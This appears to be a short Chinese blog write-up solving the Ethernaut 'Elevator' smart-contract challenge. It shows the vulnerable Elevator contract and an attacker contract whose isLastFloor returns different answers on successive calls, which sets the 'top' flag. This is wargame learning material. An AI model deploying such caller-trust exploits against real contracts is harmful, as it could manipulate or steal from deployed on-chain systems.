---
title: Ethernaut - Elevator
categories: [Ethernaut]
tags: [以太坊, 智能合约, Ethernaut]
date: 2024-12-23
---

电梯不会让你达到最顶层。

- Sometimes solidity is not good at keeping promises.

很神秘的一句话。

<!--more-->

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface Building {
    function isLastFloor(uint256) external returns (bool);
}

contract Elevator {
    bool public top;
    uint256 public floor;

    function goTo(uint256 _floor) public {
        Building building = Building(msg.sender);

        if (!building.isLastFloor(_floor)) {
            floor = _floor;
            top = building.isLastFloor(floor);
        }
    }
}
```

我自己得写一个合约，作为Building，提供一个isLastFloor函数。那我让他第一次调用返回false，第二次被调用返回true即可。

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IElevator {
    function goTo(uint256 _floor) external;
}

contract Building {
    bool isFirst;

    constructor() {
        isFirst = true;
    }

    function isLastFloor(uint256 _floor) external returns (bool) {
        if (isFirst) {
            isFirst = false;
            return false;
        } else {
            return true;
        }
    }

    function goTo(uint256 _floor) public {
        IElevator elevator = IElevator(0x295591a34Cfac609f4A6A7B5D8D5BdcAC8987dBF);

        elevator.goTo(_floor);
    } 
}
```

这关的启示是view和pure函数，他们不会修改合约的状态。

view只会读取状态，pure既不读取也不修改。

